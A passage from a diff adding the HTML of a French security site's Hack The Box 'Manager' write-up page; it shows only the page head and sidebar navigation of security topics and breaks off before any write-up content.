@@ -1,0 +1,8488 @@
+
+<!doctype html>
+<html lang="fr" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://paks3c.fr/Writeup/HTB/Machines/Manager/">
+      
+      
+        <link rel="prev" href="../Legacy/">
+      
+      
+        <link rel="next" href="../Pov/">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.26">
+    
+    
+      
+        <title>Manager - Paks3c</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.6543a935.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#nmap" class="md-skip">
+          Aller au contenu
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="En-tête">
+    <a href="../../../.." title="Paks3c" class="md-header__button md-logo" aria-label="Paks3c" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Paks3c
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Manager
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Rechercher" placeholder="Rechercher" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Recherche">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Effacer" aria-label="Effacer" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initialisation de la recherche
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Onglets" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../Azure/Entra%20ID/Bases/" class="md-tabs__link">
+          
+  
+  Azure
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../Blue%20Team/Analyse/Outils%20en%20ligne/" class="md-tabs__link">
+          
+  
+  Blue Team
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../Dev%20-%20Admin%20-%20R%C3%A9seaux/C/Bases/Boucles/" class="md-tabs__link">
+          
+  
+  Dev   Admin   Réseaux
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../Osint/Tools%20locaux/Webcams%20publiques/" class="md-tabs__link">
+          
+  
+  Osint
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../Red%20Team/1%20-%20Cheatsheet/Base%20de%20donn%C3%A9es/MSSQL/" class="md-tabs__link">
+          
+  
+  Red Team
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../Bank/" class="md-tabs__link">
+          
+  
+  Writeup
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Paks3c" class="md-nav__button md-logo" aria-label="Paks3c" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Paks3c
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Azure
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Azure
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Entra ID
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Entra ID
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Azure/Entra%20ID/Bases/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bases
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Azure/Entra%20ID/Entra%20Connect/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Entra Connect
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Azure/Entra%20ID/Entra%20Identity%20Protection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Entra Identity Protection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    IaaS
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            IaaS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Azure/IaaS/VM/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    VM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    PaaS
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            PaaS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Azure/PaaS/Containers/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Containers
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Blue Team
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Blue Team
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Analyse
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Analyse
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Analyse/Outils%20en%20ligne/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Outils en ligne
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Malware
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Malware
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Analyse/Malware/Tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_3" id="__nav_3_1_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Doc
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Doc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Analyse/doc/OleTools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OleTools
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_4" id="__nav_3_1_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Pcap
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_4">
+            <span class="md-nav__icon md-icon"></span>
+            Pcap
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Analyse/pcap/DNS%20tunneling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS tunneling
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Forensic
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Forensic
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Disque
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Disque
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Disque/Dump%20disque/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Dump disque
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Disque/Fichiers%20effac%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Fichiers effacés
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Logs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Logs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Logs/DeepBlueCli/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DeepBlueCli
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Logs/Hayabusa/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hayabusa
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Logs/Liste%20EventID/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Liste EventID
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_3" id="__nav_3_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Memoire
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Memoire
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Memoire/Dump%20m%C3%A9moire/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Dump mémoire
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Memoire/Methodologie/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Methodologie
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Memoire/Volatility%203/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Volatility 3
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_4" id="__nav_3_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Regedit
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Regedit
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Regedit/Clefs%20de%20registres/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Clefs de registres
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Regedit/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Regedit/Tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_5" id="__nav_3_2_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Splunk
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            Splunk
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Forensic/Splunk/Requ%C3%AAtes/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Requêtes
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Mails
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Mails
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Blue%20Team/Mails/Analyse%20de%20base/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Analyse de base
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Dev   Admin   Réseaux
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Dev   Admin   Réseaux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    C
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
